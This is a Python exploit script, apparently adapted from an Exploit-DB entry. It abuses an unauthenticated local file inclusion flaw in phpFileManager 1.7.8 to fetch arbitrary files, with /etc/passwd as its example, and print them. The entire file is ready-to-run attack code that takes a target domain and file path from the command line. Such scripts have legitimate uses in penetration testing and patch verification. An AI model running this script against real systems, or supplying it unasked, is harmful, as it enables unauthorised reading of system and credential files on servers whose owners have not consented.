#!/usr/bin/python3

################################################################
#
# This script requests arbitrary files from the specified domain
# without any authentication due to an existing Local File
# Inclusion (LFI) vulnerability in version 1.7.8 of
# phpFileManager and prints it out. 
# 
# Modified from code pulled from Exploit-DB, phpFileManager
# 1.7.8 - Local File Inclusion located at
# https://www.exploit-db.com/exploits/46638 by Murat Kalafatoglu. 
# 
# Note - this was tested on Kali Linux with phpFileManager 1.7.8
# (https://github.com/dulldusk/phpfm/releases)
# 
# Example: python3 phpFileManager_LFI.py -d https://my.domain.com
#              -f /etc/passwd
#
# Use the command `python3 phpFileManager_LFI.py -h` for help.
# 
################################################################


### IMPORTS ###
import requests, argparse, os, urllib.parse


### ARGUMENT PARSING ###
parser = argparse.ArgumentParser()
parser.add_argument('-d', "--domain", type=str, required=True, help="Target domain, example - https://domain.com")
parser.add_argument('-f', "--file", type=str, required=True, help="File to request, example - /etc/passwd")
args = parser.parse_args()

# make sure protocol exists
if "http" not in args.domain:
    args.domain = "https://" + args.domain

# parse file path
directory = os.path.dirname(args.file)
filename = os.path.basename(args.file)

if directory == "":
    print("[-] Please provide an absolute path")
    quit()
elif filename == "":
    print("[-] Please provide a filename")
    quit()

directory = urllib.parse.quote(directory, safe="")

# construct URL
URL = args.domain+"/index.php?action=3&fm_current_dir="+directory+"&filename="+filename


### REQUEST FILE ###
print("[+] Requesting file "+args.file+" from "+args.domain+"...\n")
try:
    request = requests.get(URL, timeout=4)

    if request.text == "":
        print("[+] Filename is a directory or empty")
        quit()
    elif "File not found" in request.text:
        print("[-] File not found")
        quit()
    elif "Read Access Denied" in request.text:
        print("[-] Permission denied")
        quit()

    print(request.text)
except requests.exceptions.RequestException as e:
    print("[-] Error requesting file -",e)
    quit()